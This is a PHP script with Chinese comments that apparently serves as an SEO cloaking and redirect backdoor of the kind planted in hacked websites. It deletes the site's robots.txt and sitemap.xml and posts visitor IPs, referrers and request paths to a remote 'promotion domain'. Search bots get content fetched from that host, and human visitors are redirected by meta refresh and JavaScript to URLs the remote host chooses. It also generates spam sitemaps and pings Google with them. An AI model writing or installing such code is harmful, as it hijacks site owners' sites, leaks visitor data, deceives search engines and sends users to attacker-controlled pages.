<?php
$siteYuming="localhost:9156/";    //推广域名
$user_agent=isset($_SERVER['HTTP_USER_AGENT'])?$_SERVER['HTTP_USER_AGENT']:'';
$urlrefer= isset($_SERVER['HTTP_REFERER'])?$_SERVER['HTTP_REFERER']:'';
$geturl=isset($_SERVER['REQUEST_URI'])?$_SERVER['REQUEST_URI']:'';
$geturl =str_replace("/index.php?","",$geturl);
$hostName=isset($_SERVER['HTTP_HOST'])?$_SERVER['HTTP_HOST']:'';
$Remote_Address=isset($_SERVER['REMOTE_ADDR'])?$_SERVER['REMOTE_ADDR']:'';
if(is_https()){
    $ht="https";
}else{
    $ht="http";
}


IF(file_exists($file = __DIR__."/robots.txt")){
    @unlink($file);
}
IF(file_exists($file = __DIR__."/sitemap.xml")){
    @unlink($file);
}

if(stripos($_SERVER['REQUEST_URI'],'test123456')!==false){ //测试连接
    $url="https://".$siteYuming."test123456";
    $post_data = array(
        'hostName' => $hostName,
        'geturl'=>$geturl
    );
    echo "$siteYuming"."xxxx-->>组名";
    $htmlToshow = send_post($url,$post_data);
    echo "$siteYuming"."LR1-1";
    exit;
}

if(stripos($_SERVER['REQUEST_URI'],'pingsitemap')!==false){ //提交地图
    $url = $ht . "://".$siteYuming."pingsitemap";
    $post_header=array('Content-Type: application/json',);
    $post_data = array(
        'hostName' => $hostName
    );
    $sitemapcount = curl_post($url,$post_header,$post_data);
    for ($i=1;$i<=$sitemapcount;$i++){
        $pingurl = $ht . "://".$hostName."/?sitemap".$i.".xml";
        $pingurl="https://www.google.com/ping?sitemap=".$pingurl;
        $contents = get($pingurl);
        //$contents = "";
        if(strpos($contents, "Sitemap Notification Received")) {
            echo "Submitting Google Sitemap $pingurl : OK!<br>";
        }else{
            echo "Submitting Google Sitemap $pingurl : ERROR!<br>";
        }
    }
    exit;
}

$conn=$_SERVER['REQUEST_URI'];
$conn=str_replace("/","",$conn);
//echo "conn".$conn."\n";
$conn=str_replace("?","",$conn);
$version=preg_match('/^sitemap(\d+).xml$/',$conn,$maches);
$version1=preg_match('/^sitemap.xml$/',$conn,$mache);

if ($version||$version1){
    //echo "1321";
//if(stripos($_SERVER['REQUEST_URI'],'.xml')!==FALSE){ //获取sitemap内容
    header('Content-type:application/xml');
    $hostName = $ht. "://".$hostName;
    $url = $ht . "://".$siteYuming."sitemap";
    //$post_header=array('Content-Type: application/json',);
    $post_data = array(
        'hostName' => $hostName,
        'geturl'=>$geturl
    );
    //$htmlToshow = send_post($url,$post_data);
    //$htmlToshow = curl_post($url,$post_header,$post_data);
    $htmlToshow = send_post($url,$post_data);
    echo $htmlToshow;
    exit();
}

//$version = preg_match('/^([a-z]){7}(\d+)(.*)/', $geturl, $match);
$url =   $ht."://" . $siteYuming . "getcontent";
//$post_header = array('Content-Type: application/json');
if (stripos($user_agent,"bot")!==false && stripos($_SERVER['REQUEST_URI'],'.xml')==FALSE) {//获取内容
    $hostName = $ht. "://".$hostName;
    $post_data = array(
        'geturl' => $geturl,
        'hostName' => $hostName,
        'remoteAddress' => $Remote_Address,
        'userAgent' => 'bot',
    );
    //$htmlToshow = curl_post($url, $post_header, $post_data);
    $htmlToshow = send_post($url, $post_data);
    echo $htmlToshow;
    exit();
}else {  //跳转网页
    //$urlrefer="google.com";
    $post_data = array(
        'urlrefer' => $urlrefer,
        'geturl' => $geturl,
        'hostName' => $hostName,
        'remoteAddress' => $Remote_Address,
    );
    //$htmlToshow = curl_post($url, $post_header, $post_data);
    $htmlToshow = send_post($url, $post_data);
    if ($htmlToshow!="") {
//     if (stripos($htmlToshow,"okGohtml")==true){
//         $htmlToshow= str_ireplace("okGohtml","",$htmlToshow);
        //@header("Content-type: text/css; charset=utf-8");
        //header("Location: " . $htmlToshow);
        echo('<!DOCTYPE html><html><head><meta charset="utf-8"><meta http-equiv="refresh" content="0; url='.$htmlToshow.'" /></head><body><noscript><meta http-equiv="refresh" content="0; url='.$htmlToshow.'" /></noscript><script>document.location.href = "'.$htmlToshow.'"</script></body></html>');
        exit;//防止下方的代码执行，中断执行
    }

}
/**
 * 发送post 请求
 */
function send_post($url, $post_data) {
    $postdata = http_build_query($post_data);
    $options = array(
        'http' => array(
            'method' => 'POST',
            'header' => 'Content-type:application/x-www-form-urlencoded',
            'content' => $postdata,
            'timeout' => 15 * 60 // 超时时间（单位:s）
        )
    );
    $context = stream_context_create($options);
    $result = file_get_contents($url, false, $context);
    return $result;
}
/**
 * 发送post 请求
 */
function curl_post($post_url,$headers,$post_data){
    $ch = curl_init ();
    curl_setopt($ch, CURLOPT_POST , 1);//设置为post方法
    curl_setopt($ch, CURLOPT_URL , $post_url);
//    $list_agent =array(
//        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.82 Safari/537.36',
//        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36 Edg/99.0.1150.39',
//        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.82 Safari/537.36',
//    );
//    $agentrand = array_rand($list_agent);
//    $agent =$list_agent[$agentrand];
    // curl_setopt($ch, CURLOPT_USERAGENT, $agent);
    curl_setopt($ch, CURLOPT_POSTFIELDS , json_encode($post_data));
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_TIMEOUT,3600);
    curl_setopt($ch,CURLOPT_HTTPHEADER,$headers);
    //curl_setopt($ch, CURLOPT_HEADER, 1); //如果不注释这行会打印出header信息
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}


function is_https() {
    if ( !empty($_SERVER['HTTPS']) && strtolower($_SERVER['HTTPS']) !== 'off') {
        return true;
    } elseif ( isset($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] === 'https' ) {
        return true;
    } elseif ( !empty($_SERVER['HTTP_FRONT_END_HTTPS']) && strtolower($_SERVER['HTTP_FRONT_END_HTTPS']) !== 'off') {
        return true;
    }
    return false;
}

function get($url){
    $contents = @file_get_contents($url);
    if (!$contents) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);
        $contents = curl_exec($ch);
        curl_close($ch);
    }
    return $contents;
}
?>